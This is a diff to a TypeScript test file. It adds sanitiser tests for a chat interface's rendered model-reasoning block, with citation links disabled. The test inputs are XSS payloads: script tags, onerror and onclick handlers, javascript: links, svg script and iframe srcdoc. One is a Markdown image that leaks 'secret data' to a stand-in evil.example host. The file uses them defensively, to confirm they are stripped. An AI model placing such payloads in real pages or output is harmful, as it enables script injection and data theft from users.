@@ -1,5 +1,5 @@
 import { afterEach, describe, expect, it } from 'vitest';
-import { renderAnswer } from '@/shared/chat/markdown';
+import { renderAnswer, renderReasoning } from '@/shared/chat/markdown';
 import type { MessageSource } from '@/shared/model';
 
 // Sanitised Markdown and citation links (spec 5.6, 6 "Privacy", D13).
@@ -197,5 +197,68 @@ describe('citation lookalikes from model output', () => {
   it('gives genuine citations only to numbers in the stored source list', () => {
     const box = html('<a data-citation="9" href="https://evil.example/">[9]</a> [9]');
     expect(box.querySelector('button')).toBeNull();
+  });
+});
+
+// The reasoning block (specs/thinking-levels.md 4.5): the same sanitiser,
+// without citation linking.
+describe('reasoning', () => {
+  function reasoning(text: string): HTMLElement {
+    const box = document.createElement('div');
+    box.append(renderReasoning(text));
+    document.body.append(box);
+    return box;
+  }
+
+  it('renders Markdown like an answer', () => {
+    const box = reasoning('First **weigh** both.\n\n- one\n- two\n\n`code`');
+    expect(box.querySelector('strong')?.textContent).toBe('weigh');
+    expect(box.querySelectorAll('ul li')).toHaveLength(2);
+    expect(box.querySelector('code')?.textContent).toBe('code');
+  });
+
+  it('drops scripts, event handlers, dangerous URLs and anything that loads', async () => {
+    const box = reasoning(
+      [
+        'Thinking <script>globalThis.pwned = 1</script>',
+        '<img src="x" onerror="globalThis.pwned = 2">',
+        '<a href="javascript:globalThis.pwned=3">x</a>',
+        '[y](javascript:globalThis.pwned=4)',
+        '<iframe srcdoc="x"></iframe>',
+        '<div onclick="globalThis.pwned=5" style="position:fixed">z</div>',
+        '<svg><script>globalThis.pwned=6</script></svg>',
+        '<form><button>b</button></form>',
+        '![secret data](https://evil.example/leak?q=1)',
+      ].join('\n\n'),
+    );
+    await new Promise((resolve) => setTimeout(resolve, 20));
+    expect(box.querySelector('script, img, iframe, svg, form, button, style')).toBeNull();
+    for (const el of box.querySelectorAll('*')) {
+      for (const attr of el.getAttributeNames()) {
+        expect(attr.startsWith('on')).toBe(false);
+        expect(attr).not.toBe('style');
+      }
+    }
+    for (const a of box.querySelectorAll('a')) {
+      expect(a.getAttribute('href') ?? '').not.toMatch(/javascript/i);
+    }
+    expect(box.innerHTML).not.toContain('evil.example');
+    expect((globalThis as Record<string, unknown>).pwned).toBeUndefined();
+  });
+
+  it('marks links as external, like an answer does', () => {
+    const link = reasoning('See [the docs](https://docs.example/a).').querySelector('a');
+    expect(link?.className).toBe('external-link');
+    expect(link?.getAttribute('target')).toBe('_blank');
+    expect(link?.getAttribute('rel')).toBe('noopener noreferrer');
+    expect(link?.getAttribute('title')).toBe('https://docs.example/a');
+  });
+
+  it('never links citations: [n] stays text, and forged ones are stripped', () => {
+    const box = reasoning(
+      'Page [1] says so, [3] too. <button class="citation" data-citation="1">[1]</button>',
+    );
+    expect(box.querySelector('button, .citation, [data-citation], [aria-label]')).toBeNull();
+    expect(box.textContent).toContain('Page [1] says so, [3] too.');
   });
 });
